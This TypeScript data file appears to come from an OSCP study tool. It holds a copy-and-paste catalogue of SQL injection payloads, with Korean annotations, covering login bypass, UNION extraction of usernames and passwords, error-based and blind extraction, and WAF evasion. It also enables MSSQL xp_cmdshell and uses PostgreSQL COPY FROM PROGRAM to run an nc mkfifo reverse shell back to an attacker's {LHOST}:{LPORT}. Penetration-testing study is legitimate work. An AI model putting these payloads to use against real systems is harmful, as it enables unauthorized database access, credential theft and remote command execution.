// SQLmap and other automated SQLi tools are banned on the OSCP exam, so this
// is a copy-only reference: nothing here sends a request or picks a payload
// automatically, the user pastes it into the request editor and sends it
// themselves.
export type SqlPayload = { label: string; payload: string; note?: string };
export type SqlPayloadCategory = {
  id: string;
  title: string;
  engines: string[];
  description: string;
  payloads: SqlPayload[];
};

export const sqlPayloadCategories: SqlPayloadCategory[] = [
  {
    id: "syntax-break",
    title: "에러 유발 탐지 (Fuzzing)",
    engines: ["generic"],
    description: "본격적인 추출 전에 가장 먼저 시도할 구문 파괴 테스트입니다. 정상 값(예: test)을 " +
      "먼저 보내 기준 응답(상태 코드·길이)을 확보한 뒤, 아래 값들과 비교하세요. 500 에러나 " +
      "'SQL syntax'·'unclosed quotation mark' 같은 문구가 뜨면 SQLi 가능성이 매우 높고, " +
      "에러가 안 보여도 응답 길이·상태 코드가 기준과 다르면 구문 파싱에 영향을 준 것입니다.",
    payloads: [
      { label: "싱글 쿼테이션", payload: "'",
        note: "가장 먼저 시도. 문자열을 감싸는 따옴표와 충돌시켜 구문을 깨뜨립니다." },
      { label: "더블 쿼테이션", payload: "\"",
        note: "MSSQL/Oracle 등 큰따옴표를 식별자로 쓰는 DB에서 시도." },
      { label: "백틱", payload: "`", note: "MySQL 컬럼·테이블명 구분자를 깨뜨립니다." },
      { label: "이스케이프 역슬래시", payload: "\\",
        note: "MySQL에서 뒤따르는 따옴표를 이스케이프해 필터링 로직이 깨지는지 확인." },
      { label: "따옴표 + 주석", payload: "'-- -",
        note: "따옴표 단독 결과와 비교하세요. 여기서 에러가 사라지면 뒤쪽 구문이 문제였다는 뜻입니다." },
    ],
  },
  {
    id: "auth-bypass",
    title: "인증 우회",
    engines: ["generic"],
    description: "로그인 폼의 username/password 필드에서 조건을 항상 참으로 만듭니다.",
    payloads: [
      { label: "OR 조건 (주석)", payload: "' OR '1'='1'-- -" },
      { label: "OR 조건 (해시 주석, MySQL)", payload: "' OR '1'='1'#" },
      { label: "관리자 계정 지정", payload: "admin'-- -" },
      { label: "UNION 기반 로그인", payload: "' UNION SELECT 1,'admin','x'-- -",
        note: "컬럼 수·타입을 먼저 UNION 카테고리로 확인한 뒤 맞추세요." },
    ],
  },
  {
    id: "union",
    title: "UNION 기반 추출",
    engines: ["mysql", "mssql", "postgresql", "oracle"],
    description: "컬럼 수를 먼저 확인한 뒤, 문자열이 들어가는 컬럼을 찾아 데이터를 추출합니다.",
    payloads: [
      { label: "컬럼 수 탐색 (ORDER BY)", payload: "' ORDER BY 1-- -",
        note: "숫자를 늘려가며 에러가 나는 지점 직전이 컬럼 수." },
      { label: "컬럼 수 탐색 (UNION NULL)", payload: "' UNION SELECT NULL,NULL,NULL-- -",
        note: "NULL 개수를 컬럼 수에 맞춰 조절." },
      { label: "문자열 컬럼 확인", payload: "' UNION SELECT 'a','b','c'-- -" },
      { label: "DB 버전 (MySQL/PostgreSQL)", payload: "' UNION SELECT @@version,NULL,NULL-- -" },
      { label: "DB 버전 (MSSQL)", payload: "' UNION SELECT @@version,NULL,NULL--" },
      { label: "DB 버전 (Oracle)", payload: "' UNION SELECT banner,NULL,NULL FROM v$version--" },
      { label: "테이블 목록 (MySQL)",
        payload: "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -" },
      { label: "컬럼 목록 (MySQL, 테이블 지정)",
        payload: "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns " +
          "WHERE table_name='users'-- -" },
      { label: "자격증명 추출 예시",
        payload: "' UNION SELECT username,password,NULL FROM users-- -" },
    ],
  },
  {
    id: "error-based",
    title: "에러 기반 추출",
    engines: ["mysql", "mssql", "postgresql"],
    description: "쿼리 에러 메시지에 데이터를 실어 응답으로 유출시킵니다. UNION 컬럼 수를 몰라도 됩니다.",
    payloads: [
      { label: "MySQL extractvalue", payload: "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- -" },
      { label: "MySQL updatexml", payload: "' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -" },
      { label: "MSSQL CONVERT 에러", payload: "' AND 1=CONVERT(int,(SELECT @@version))--" },
      { label: "PostgreSQL CAST 에러", payload: "' AND 1=CAST((SELECT version()) AS int)-- -" },
    ],
  },
  {
    id: "boolean-blind",
    title: "불리언 기반 Blind",
    engines: ["mysql", "mssql", "postgresql"],
    description: "응답 내용(참/거짓에 따라 페이지가 달라짐)만으로 데이터를 한 글자씩 유추합니다.",
    payloads: [
      { label: "참/거짓 기준 확인", payload: "' AND 1=1-- -" },
      { label: "거짓 비교 (기준과 대조)", payload: "' AND 1=2-- -" },
      { label: "길이 확인", payload: "' AND (SELECT LENGTH(database()))>5-- -" },
      { label: "문자 하나씩 비교 (MySQL)",
        payload: "' AND (SELECT SUBSTRING(database(),1,1))='a'-- -" },
      { label: "문자 하나씩 비교 (MSSQL)",
        payload: "' AND SUBSTRING((SELECT DB_NAME()),1,1)='a'--" },
    ],
  },
  {
    id: "time-blind",
    title: "시간 기반 Blind",
    engines: ["mysql", "mssql", "postgresql", "oracle"],
    description: "응답이 없거나 애매할 때, 응답 지연 여부로만 참/거짓을 판단합니다. 지연 시간은 짧게 유지하세요.",
    payloads: [
      { label: "MySQL SLEEP", payload: "' AND SLEEP(5)-- -" },
      { label: "MySQL 조건부 SLEEP", payload: "' AND IF(1=1,SLEEP(5),0)-- -" },
      { label: "MSSQL WAITFOR", payload: "'; WAITFOR DELAY '0:0:5'--" },
      { label: "PostgreSQL pg_sleep", payload: "' AND (SELECT pg_sleep(5))-- -" },
      { label: "Oracle DBMS_LOCK", payload: "' AND (SELECT CASE WHEN (1=1) THEN " +
        "dbms_lock.sleep(5) ELSE NULL END FROM dual)-- -" },
    ],
  },
  {
    id: "mssql-xp-cmdshell",
    title: "MSSQL xp_cmdshell",
    engines: ["mssql"],
    description: "sa/sysadmin 권한 계정에서만 동작합니다. 활성화 자체가 침해적이니 범위와 위험을 검토한 뒤 실행하세요.",
    payloads: [
      { label: "고급 옵션 노출", payload: "EXEC sp_configure 'show advanced options',1; RECONFIGURE;" },
      { label: "xp_cmdshell 활성화", payload: "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;" },
      { label: "명령 실행", payload: "EXEC xp_cmdshell 'whoami';" },
      { label: "UNION으로 결과 유출",
        payload: "'; EXEC xp_cmdshell 'whoami'-- -",
        note: "결과가 응답에 안 보이면 stacked query 지원 여부와 out-of-band 방법을 검토." },
    ],
  },
  {
    id: "postgres-copy-program",
    title: "PostgreSQL COPY FROM PROGRAM",
    engines: ["postgresql"],
    description: "superuser 권한 계정에서만 동작합니다(pg_read_server_files 등 관련 롤도 확인). " +
      "COPY ... FROM PROGRAM은 DB 프로세스 권한으로 임의 OS 명령을 실행합니다 -- 명령 자리에 " +
      "리버스 쉘 페이로드(리버스 쉘 탭의 nc-mkfifo 등)를 넣으면 그대로 셸 연결로 이어집니다.",
    payloads: [
      { label: "명령 실행 + 결과 조회 (이미 쿼리 인터페이스가 있는 경우)",
        payload: "CREATE TABLE cmd_exec(output text); COPY cmd_exec FROM PROGRAM 'whoami'; " +
          "SELECT * FROM cmd_exec;",
        note: "결과를 응답에서 바로 읽을 수 있을 때 (관리 콘솔, UNION 등). " +
          "테이블이 이미 있으면 DROP TABLE IF EXISTS cmd_exec;를 앞에 추가하세요." },
      { label: "리버스 쉘 (인젝션 컨텍스트, stacked query)",
        payload: "'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(output text); " +
          "COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|" +
          "nc {LHOST} {LPORT} >/tmp/f';--",
        note: "{LHOST}/{LPORT}는 아래 입력값으로 자동 치환됩니다 -- 감지 안 되면 직접 채워 넣으세요. " +
          "같은 포트로 Enumeration 탭의 리버스 쉘 패널(Ctrl+K에서 \"리버스쉘\" 검색)에서 리스너를 " +
          "준비한 뒤 이 페이로드를 보내세요. 결과가 응답에 안 보여도 상관없습니다 -- 리스너에 " +
          "연결되는지로 성공 여부를 확인하면 됩니다." },
    ],
  },
  {
    id: "waf-bypass",
    title: "필터·WAF 우회",
    engines: ["generic"],
    description: "공백·키워드 필터링을 우회할 때 시도할 대체 표현들입니다.",
    payloads: [
      { label: "공백 대신 주석", payload: "'/**/OR/**/'1'='1" },
      { label: "공백 대신 개행/탭", payload: "'%0aOR%0a'1'='1" },
      { label: "대소문자 혼합", payload: "' oR '1'='1" },
      { label: "이중 인코딩 따옴표", payload: "%2527 OR %25271%2527=%25271" },
      { label: "주석으로 키워드 분리 (MySQL)", payload: "UN/**/ION SEL/**/ECT" },
    ],
  },
];

export const findSqlPayloadCategory = (id: string) =>
  sqlPayloadCategories.find((category) => category.id === id);
